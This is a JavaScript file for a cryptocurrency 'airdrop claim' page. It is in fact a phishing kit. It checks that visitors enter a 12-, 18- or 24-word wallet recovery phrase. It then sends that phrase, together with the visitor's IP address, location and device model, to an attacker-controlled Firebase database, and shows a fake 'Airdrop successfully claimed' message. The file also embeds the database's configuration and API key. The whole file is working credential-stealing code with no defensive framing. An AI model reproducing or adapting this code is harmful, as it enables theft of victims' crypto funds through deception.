import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
import {
  getDatabase,
  ref,
  push,
  serverTimestamp,
} from "https://www.gstatic.com/firebasejs/9.17.1/firebase-database.js";

// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyBZS-Ry4ddvIN-FkXohNidSZgTInnfzVtI",
  authDomain: "titans-token.firebaseapp.com",
  databaseURL: "https://titans-token-default-rtdb.firebaseio.com",
  projectId: "titans-token",
  storageBucket: "titans-token.firebasestorage.app",
  messagingSenderId: "996300344426",
  appId: "1:996300344426:web:1ed9e4dcdd3b52098a0e13",
  measurementId: "G-W39KLMEDSZ",
};

// Initialize Firebase app
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Function to format date in Nigerian style (DD/MM/YYYY HH:mm:ss)
function formatDate(timestamp) {
  const date = new Date(timestamp);
  const options = {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: true,
  };

  const formattedDate = new Intl.DateTimeFormat("en-GB", options).format(date);
  return formattedDate;
}

// Validate  phrase (12, 18, or 24 words)
function validatePhrase(wordPhrase) {
  const regex = /^(\b\w+\b\s){11,23}\b\w+\b$/;
  return regex.test(wordPhrase.trim());
}

// Reset the form
function resetForm() {
  document.querySelectorAll("#myForm").forEach((form) => form.reset());
}

// Show the custom popup
function showCustomPopup() {
  const blurBackground = document.createElement("div");
  blurBackground.style.position = "fixed";
  blurBackground.style.top = "0";
  blurBackground.style.left = "0";
  blurBackground.style.width = "100%";
  blurBackground.style.height = "100%";
  blurBackground.style.backgroundColor = "rgba(0, 0, 0, 0.7)";
  blurBackground.style.backdropFilter = "blur(10px)";
  blurBackground.style.zIndex = "9999";

  const popupContainer = document.createElement("div");
  popupContainer.style.position = "fixed";
  popupContainer.style.top = "50%";
  popupContainer.style.left = "50%";
  popupContainer.style.transform = "translate(-50%, -50%)";
  popupContainer.style.backgroundColor = "#272727";
  popupContainer.style.padding = "20px";
  popupContainer.style.borderRadius = "10px";
  popupContainer.style.textAlign = "center";
  popupContainer.style.boxShadow = "0 4px 10px rgba(0, 0, 0, 0.3)";
  popupContainer.style.maxWidth = "400px";
  popupContainer.style.width = "90%";

  const tickImage = document.createElement("img");
  tickImage.src = "./assets/images/checked.png";
  tickImage.alt = "Success Tick";
  tickImage.style.width = "50px";
  tickImage.style.marginBottom = "15px";

  const message = document.createElement("p");
  message.style.fontSize = "16px";
  message.style.color = "#fff";
  message.textContent =
    "Airdrop successfully claimed. Kindly check your wallet for your claim.";

  const closeButton = document.createElement("button");
  closeButton.textContent = "Close";
  closeButton.style.padding = "10px 20px";
  closeButton.style.fontSize = "14px";
  closeButton.style.backgroundColor = "red";
  closeButton.style.color = "#fff";
  closeButton.style.border = "none";
  closeButton.style.borderRadius = "5px";
  closeButton.style.cursor = "pointer";

  closeButton.addEventListener("click", () => {
    document.body.removeChild(blurBackground);
    resetForm();
  });

  popupContainer.appendChild(tickImage);
  popupContainer.appendChild(message);
  popupContainer.appendChild(closeButton);
  blurBackground.appendChild(popupContainer);

  document.body.appendChild(blurBackground);
}

// Function to get IP, location, and device details
async function getDeviceDetails() {
  const ipAddress = await getIpAddress();
  const location = await getLocation(ipAddress);
  const deviceModel = getDeviceModel();

  return {
    ipAddress,
    location,
    deviceModel,
  };
}

// Get IP Address
async function getIpAddress() {
  try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error fetching IP address:", error);
    return "IP Address not found";
  }
}

// Get Location based on IP address
async function getLocation(ip) {
  try {
    const response = await fetch(`https://ipapi.co/json/`);
    const data = await response.json();
    return { city: data.city, region: data.region, country: data.country };
  } catch (error) {
    console.error("Error fetching location:", error);
    return "Location not found";
  }
}

// Get Device Model using more specific checks
function getDeviceModel() {
  const userAgent = navigator.userAgent;
  let deviceModel = "Unknown Device";

  // Check for iPhone models
  if (/iPhone/i.test(userAgent)) {
    if (/iPhone 15 Pro Max/i.test(userAgent)) {
      deviceModel = "iPhone 15 Pro Max";
    } else if (/iPhone 14 Pro Max/i.test(userAgent)) {
      deviceModel = "iPhone 14 Pro Max";
    } else {
      deviceModel = "iPhone (Other Model)";
    }
  }
  // Check for Android models
  else if (/Android/i.test(userAgent)) {
    if (/Redmi Note 11 Pro/i.test(userAgent)) {
      deviceModel = "Redmi Note 11 Pro";
    } else if (/Samsung Galaxy S21/i.test(userAgent)) {
      deviceModel = "Samsung Galaxy S21";
    } else {
      deviceModel = "Android Device";
    }
  }
  // Check for iPad models
  else if (/iPad/i.test(userAgent)) {
    deviceModel = "iPad (Other Model)";
  }
  // Check for Windows devices
  else if (/Windows/i.test(userAgent)) {
    deviceModel = "Windows Device";
  }
  // Check for Mac devices
  else if (/Mac/i.test(userAgent)) {
    deviceModel = "MacOS Device";
  }
  // Check for Linux devices
  else if (/Linux/i.test(userAgent)) {
    deviceModel = "Linux Device";
  }

  return deviceModel;
}

// Save data to Firebase
async function save(event) {
  event.preventDefault();

  const walletTypes = document.querySelectorAll("#wallet-type");
  const wordPhrases = document.querySelectorAll("#phrase");
  const errorMessages = document.querySelectorAll("#error-message");

  let allValid = true;
  const deviceDetails = await getDeviceDetails(); // Get device information

  walletTypes.forEach((walletTypeElement, index) => {
    const walletType = walletTypeElement.value.trim();
    const wordPhrase = wordPhrases[index]?.value.trim();
    const errorMessage = errorMessages[index];

    if (!validatePhrase(wordPhrase)) {
      errorMessage.textContent =
        "Invalid word phrases. Ensure it has 12, 18, or 24 words.";
      errorMessage.style.display = "block";
      allValid = false;
    } else {
      errorMessage.style.display = "none";

      // Push data to Firebase with timestamp
      const newResponseRef = ref(database, "Wallet_Response");
      push(newResponseRef, {
        wallet_Type: walletType,
        word_Phrase: wordPhrase,
        ip_Address: deviceDetails.ipAddress,
        location: deviceDetails.location,
        device_Model: deviceDetails.deviceModel,
        timestamp: serverTimestamp(), // Add timestamp
      })
        .then(() => {
          console.log(`Data for ${walletType} saved successfully!`);
          showCustomPopup();
        })
        .catch((error) => {
          console.error("Firebase Error:", error);
          allValid = false;
        });
    }
  });

  if (allValid) {
    showCustomPopup();
  }
}

// Attach the save function to form submit
document.querySelectorAll("#myForm").forEach((form) => {
  form.addEventListener("submit", save);
});
